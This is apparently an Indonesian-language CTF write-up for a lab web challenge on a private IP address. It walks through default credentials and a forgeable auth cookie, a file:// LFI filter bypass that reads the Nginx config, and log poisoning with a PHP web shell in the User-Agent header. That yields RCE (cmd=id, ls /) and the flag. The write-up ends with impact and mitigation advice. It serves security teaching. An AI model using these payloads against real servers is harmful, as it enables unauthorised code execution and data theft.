[[Local File Inclusion (LFI)]] | [[Remote Code Execution (RCE)]]

- [[#1 Kerentanan yang Ditemukan|1 Kerentanan yang Ditemukan]]
	- [[#1 Kerentanan yang Ditemukan#1.1 Virtual Host / Host Header Misconfiguration|1.1 Virtual Host / Host Header Misconfiguration]]
	- [[#1 Kerentanan yang Ditemukan#1.2 Broken Authentication / Weak Default Credentials|1.2 Broken Authentication / Weak Default Credentials]]
	- [[#1 Kerentanan yang Ditemukan#1.3 Local File Inclusion (LFI) via PHP Stream Wrapper (`file://`)|1.3 Local File Inclusion (LFI) via PHP Stream Wrapper (`file://`)]]
	- [[#1 Kerentanan yang Ditemukan#1.4 Log Poisoning -> Remote Code Execution (RCE)|1.4 Log Poisoning -> Remote Code Execution (RCE)]]
- [[#2 Langkah Pengerjaan|2 Langkah Pengerjaan]]
	- [[#2 Langkah Pengerjaan#2.1 Step 1 - Konfigurasi Akses Domain (Virtual Host Bypass)|2.1 Step 1 - Konfigurasi Akses Domain (Virtual Host Bypass)]]
	- [[#2 Langkah Pengerjaan#2.2 Step 2 - Reconnaissance|2.2 Step 2 - Reconnaissance]]
	- [[#2 Langkah Pengerjaan#2.3 Step 3 - Login dengan Default Credential & Session Manipulation|2.3 Step 3 - Login dengan Default Credential & Session Manipulation]]
	- [[#2 Langkah Pengerjaan#2.4 Step 4 - Eksplorasi LFI & Bypass Filter Path Traversal|2.4 Step 4 - Eksplorasi LFI & Bypass Filter Path Traversal]]
	- [[#2 Langkah Pengerjaan#2.5 Step 5 - Log Poisoning (Injeksi Payload ke Server Log)|2.5 Step 5 - Log Poisoning (Injeksi Payload ke Server Log)]]
	- [[#2 Langkah Pengerjaan#2.6 Step 6 - Remote Code Execution via Log Inclusion|2.6 Step 6 - Remote Code Execution via Log Inclusion]]
	- [[#2 Langkah Pengerjaan#2.7 Step 7 - Flag Retrieval|2.7 Step 7 - Flag Retrieval]]
- [[#3 Dampak|3 Dampak]]
- [[#4 Mitigasi|4 Mitigasi]]


| Detail | Keterangan |
| :--- | :--- |
| **IP Target** | 192.168.100.23 |
| **Domain** | residualtrace.netics |
| **Difficulty** | **Easy** |
| **Author** | Kadek Fajar Pramartha Yasodana |

## 1 Kerentanan yang Ditemukan

### 1.1 Virtual Host / Host Header Misconfiguration
Sama seperti challenge sebelumnya, server hanya merespons dengan konten yang benar apabila request menggunakan `Host` header yang sesuai (`residualtrace.netics`). Hal ini dapat disiasati menggunakan fitur *Hostname Resolution Overrides* pada Burp Suite.

### 1.2 Broken Authentication / Weak Default Credentials
Halaman login aplikasi web menerima credential default `admin:admin` tanpa mekanisme perlindungan apapun (tidak ada rate limiting, CAPTCHA, maupun kebijakan password). Autentikasi hanya direpresentasikan oleh cookie `authenticated=true` tanpa token yang terverifikasi secara server-side, sehingga nilai cookie ini dapat dimanipulasi secara trivial.

### 1.3 Local File Inclusion (LFI) via PHP Stream Wrapper (`file://`)
Parameter `page` pada `index.php` rentan terhadap **Local File Inclusion (LFI)**. Meskipun path traversal konvensional (`../`) telah diblokir, filter tidak mencakup PHP stream wrapper `file://`. Penyerang dapat memanfaatkan `file:///path/to/file` untuk membaca file arbitrer di sistem, termasuk file konfigurasi sensitif seperti `/etc/nginx/nginx.conf`.

### 1.4 Log Poisoning -> Remote Code Execution (RCE)
Dengan mengetahui lokasi file log Nginx dari kerentanan LFI, penyerang dapat melakukan **Log Poisoning** dengan menyisipkan payload PHP pada header `User-Agent`. Karena Nginx mencatat User-Agent ke dalam file log dan file log tersebut dapat di-*include* melalui parameter `page`, payload PHP yang tersimpan di log akan dieksekusi oleh PHP interpreter sehingga mengakibatkan **RCE** penuh.

## 2 Langkah Pengerjaan

### 2.1 Step 1 - Konfigurasi Akses Domain (Virtual Host Bypass)
Mirip seperti di *Unnoticed Path*, saat mengakses target melalui IP di browser, server menampilkan informasi bahwa domain sesungguhnya adalah `residualtrace.netics`. Domain tersebut tidak dapat diakses langsung karena tidak ada entri DNS publik.

**Solusi:** Menambahkan entri pada **Hostname Resolution Overrides** di Burp Suite:

| Hostname | IP Address |
| :--- | :--- |
| `residualtrace.netics` | `192.168.100.23` |

![[2-ipweb.png]]
![[2-dns.png]]
![[2-awal-web.png]]

### 2.2 Step 2 - Reconnaissance
Pemindaian port menggunakan Nmap dieksekusi untuk memetakan *attack surface* target.

```bash
nmap 192.168.100.23
```

**Hasil temuan:**
* Port **80/tcp** - Hanya satu layanan HTTP yang terbuka. Berbeda dari challenge sebelumnya, tidak ada FTP, sehingga *attack surface* sepenuhnya tersentralisasi pada kerentanan *web-based*.

![[2-nmap.png]]

### 2.3 Step 3 - Login dengan Default Credential & Session Manipulation
Halaman utama web menampilkan portal login. Tanpa adanya jalur enumerasi seperti FTP pada challenge sebelumnya, percobaan pertama langsung menggunakan credential default `admin:admin`.

![[2-login.png]]

Login berhasil. Yang lebih kritis, sistem menggunakan cookie `authenticated=true` sebagai penanda sesi tanpa token kriptografis maupun validasi server-side. Nilai cookie statis ini dapat dimanipulasi langsung melalui browser developer tools, menjadikannya contoh klasik **Broken Authentication**.

![[2-admin.png]]

### 2.4 Step 4 - Eksplorasi LFI & Bypass Filter Path Traversal
URL dashboard memuat parameter `page` yang bergantung pada input pengguna, mengindikasikan potensi **Local File Inclusion (LFI)**. Percobaan path traversal standar dieksekusi pertama kali:

```text
http://residualtrace.netics/index.php?page=../../../../../../../etc/passwd
```

Server mengembalikan blokade: `You shall not pass.` - filter karakter `../` aktif.

![[2-pathtraversal.png]]

Namun filter tersebut tidak mencakup PHP stream wrapper. Percobaan dengan skema URI absolut `file://` berhasil melewati filter:

```text
http://residualtrace.netics/index.php?page=file:///etc/nginx/nginx.conf
```

Konfigurasi Nginx terbaca dan mengungkap lokasi file log akses:

```text
/var/log/nginx/debugging.log
```

![[2-nginx-conf.png]]

### 2.5 Step 5 - Log Poisoning (Injeksi Payload ke Server Log)
Nginx mencatat header `User-Agent` dari setiap request ke dalam file log tanpa sanitasi karakter. Dengan memodifikasi nilai `User-Agent` menjadi payload PHP melalui Burp Suite, skrip tersebut akan tersimpan di dalam `debugging.log`:

```http
GET / HTTP/1.1
Host: residualtrace.netics
User-Agent: <?php system($_GET['cmd']); ?>
```

Setelah request dikirim, file log kini mengandung payload PHP yang siap dieksekusi.

![[2-poison.png]]

### 2.6 Step 6 - Remote Code Execution via Log Inclusion
File log yang telah ter-*poisoned* di-include melalui kerentanan LFI disertai parameter `cmd`. PHP interpreter menafsirkan payload di dalam log sebagai kode yang dapat dieksekusi:

```text
http://residualtrace.netics/index.php?page=file:///var/log/nginx/debugging.log&cmd=id
```

**Output:**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE penuh terkonfirmasi dengan konteks user `www-data`.

![[2-id.png]]

### 2.7 Step 7 - Flag Retrieval
Direktori root diperiksa untuk menemukan file flag:

```text
http://residualtrace.netics/index.php?page=file:///var/log/nginx/debugging.log&cmd=ls /
```

![[2-ls-root.png]]

File flag ditemukan. Untuk membacanya, dimanfaatkan langsung kerentanan LFI via `file://` tanpa perlu RCE:

```text
http://residualtrace.netics/index.php?page=file:///flag-c9854415-bc07-4266-9026-cae1486d7d04-netics.txt
```

![[2-flag.png]]

> **`NETICS{lfi_is_fun_c9854415-bc07-4266-9026-cae1486d7d04}`**

## 3 Dampak

| Kerentanan | Dampak |
| :--- | :--- |
| Virtual Host Misconfiguration | Penyerang dapat mengakses aplikasi yang seharusnya tidak diekspos secara publik. |
| Weak Default Credentials | Akses tidak sah ke panel admin hanya dengan menebak credential default. |
| Broken Authentication (Cookie) | Cookie `authenticated=true` dapat dimanipulasi tanpa validasi server-side. |
| LFI via `file://` Wrapper | Penyerang dapat membaca file arbitrer termasuk konfigurasi sensitif, private key, dan credential database. |
| Log Poisoning -> RCE | Penyerang memiliki kendali penuh atas server - baca/ubah data, pivot, instalasi backdoor. |

## 4 Mitigasi

1. **Virtual Host Misconfiguration**
   Pastikan server hanya merespons request dari domain yang valid. Konfigurasi default virtual host agar tidak membocorkan informasi domain internal.

2. **Weak Default Credentials & Broken Authentication**
   Hapus atau ubah seluruh credential default sebelum deployment ke produksi. Implementasikan session token yang divalidasi di sisi server. Terapkan rate limiting, account lockout, dan CAPTCHA pada halaman login.

3. **LFI via PHP Stream Wrapper**
   Jangan gunakan input user secara langsung sebagai argumen `include()` atau `require()`. Terapkan allowlist ketat untuk nilai parameter `page`. Nonaktifkan stream wrapper yang tidak diperlukan:
   ```ini
   allow_url_include = Off
   allow_url_fopen   = Off
   ```
   Validasi input dengan memastikan tidak ada karakter `://` atau path separator yang tidak diizinkan.

4. **Log Poisoning**
   Batasi akses baca file log hanya untuk proses/user yang memerlukannya. Pastikan direktori log tidak dapat diakses melalui file inclusion. Aktifkan `open_basedir` pada konfigurasi PHP.